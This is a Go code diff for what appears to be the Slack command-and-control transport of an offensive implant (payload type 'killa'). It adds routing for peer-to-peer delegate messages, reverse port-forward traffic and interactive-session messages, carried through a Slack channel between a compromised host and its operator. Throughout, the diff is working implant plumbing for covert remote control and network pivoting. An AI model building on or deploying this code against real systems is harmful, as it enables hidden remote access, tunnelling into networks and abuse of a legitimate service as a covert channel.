@@ -33,6 +33,14 @@ type SlackProfile struct {
 	PollInterval  time.Duration
 	client        *slack.Client
 	lastTs        string
+
+	GetDelegatesOnly       func() []structs.DelegateMessage
+	GetDelegatesAndEdges   func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
+	HandleDelegates        func(delegates []structs.DelegateMessage)
+	GetRpfwdOutbound       func() []structs.SocksMsg
+	HandleRpfwd            func(msgs []structs.SocksMsg)
+	GetInteractiveOutbound func() []structs.InteractiveMsg
+	HandleInteractive      func(msgs []structs.InteractiveMsg)
 }
 
 func NewSlackProfile(botToken, channelID, encryptionKey string, pollIntervalSeconds int, debug bool) *SlackProfile {
@@ -66,6 +74,21 @@ func (s *SlackProfile) Checkin(agent *structs.Agent) error {
 
 func (s *SlackProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
 	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: s.getActiveUUID(agent), PayloadType: "killa", C2Profile: "slack"}
+	if s.GetDelegatesOnly != nil {
+		if delegates := s.GetDelegatesOnly(); len(delegates) > 0 {
+			msg.Delegates = delegates
+		}
+	}
+	if s.GetRpfwdOutbound != nil {
+		if rpfwdMsgs := s.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
+			msg.Rpfwd = rpfwdMsgs
+		}
+	}
+	if s.GetInteractiveOutbound != nil {
+		if interactiveMsgs := s.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
+			msg.Interactive = interactiveMsgs
+		}
+	}
 	resp, err := s.sendAndPoll(s.getActiveUUID(agent), msg, 10*time.Second)
 	if err != nil {
 		return nil, nil, fmt.Errorf("slack get_tasking send/poll failed: %w", err)
@@ -88,12 +111,40 @@ func (s *SlackProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.
 			_ = json.Unmarshal(socksRaw, &inboundSocks)
 		}
 	}
+	s.routeInboundMessages(m)
 	return tasks, inboundSocks, nil
 }
 
 func (s *SlackProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
 	msg := structs.PostResponseMessage{Action: "post_response", Responses: []structs.Response{response}, Socks: socks}
-	return s.sendAndPoll(s.getActiveUUID(agent), msg, 5*time.Second)
+	if s.GetRpfwdOutbound != nil {
+		if rpfwdMsgs := s.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
+			msg.Rpfwd = rpfwdMsgs
+		}
+	}
+	if s.GetDelegatesAndEdges != nil {
+		delegates, edges := s.GetDelegatesAndEdges()
+		if len(delegates) > 0 {
+			msg.Delegates = delegates
+		}
+		if len(edges) > 0 {
+			msg.Edges = edges
+		}
+	}
+	if s.GetInteractiveOutbound != nil {
+		if interactiveMsgs := s.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
+			msg.Interactive = interactiveMsgs
+		}
+	}
+	resp, err := s.sendAndPoll(s.getActiveUUID(agent), msg, 5*time.Second)
+	if err != nil {
+		return nil, err
+	}
+	var parsed map[string]any
+	if err := json.Unmarshal(resp, &parsed); err == nil {
+		s.routeInboundMessages(parsed)
+	}
+	return resp, nil
 }
 
 func (s *SlackProfile) GetCallbackUUID() string { return s.CallbackUUID }
@@ -160,6 +211,39 @@ func (s *SlackProfile) getActiveUUID(agent *structs.Agent) string {
 		return s.CallbackUUID
 	}
 	return agent.PayloadUUID
+}
+
+func (s *SlackProfile) routeInboundMessages(m map[string]any) {
+	if s.HandleRpfwd != nil {
+		if rpfwdList, exists := m["rpfwd"]; exists {
+			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
+				var rpfwdMsgs []structs.SocksMsg
+				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
+					s.HandleRpfwd(rpfwdMsgs)
+				}
+			}
+		}
+	}
+	if s.HandleInteractive != nil {
+		if interactiveList, exists := m["interactive"]; exists {
+			if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
+				var interactiveMsgs []structs.InteractiveMsg
+				if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
+					s.HandleInteractive(interactiveMsgs)
+				}
+			}
+		}
+	}
+	if s.HandleDelegates != nil {
+		if delegateList, exists := m["delegates"]; exists {
+			if delegateRaw, err := json.Marshal(delegateList); err == nil {
+				var delegates []structs.DelegateMessage
+				if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
+					s.HandleDelegates(delegates)
+				}
+			}
+		}
+	}
 }
 
 func (s *SlackProfile) encodeEnvelope(activeUUID string, data []byte) (string, error) {
